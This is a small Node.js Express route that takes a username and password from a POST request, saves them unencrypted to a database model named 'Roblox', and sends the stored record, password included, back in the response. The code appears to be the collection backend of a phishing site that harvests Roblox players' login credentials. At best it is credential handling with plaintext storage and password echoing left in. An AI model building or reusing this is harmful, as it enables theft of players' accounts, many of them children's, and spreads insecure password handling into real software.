const express = require('express');
const router = express.Router();
const Roblox = require('../models/Roblox');


router.post('/', async (req, res ) =>{
    const {username, password} = req.body;
    const robloxAccount = new Roblox({
        username: username,
        password: password
    })
    try{
    const savedAccount = await robloxAccount.save();
    res.json(savedAccount);
    }
    catch(err){
        console.log(err);
    }
    
})


module.exports = router;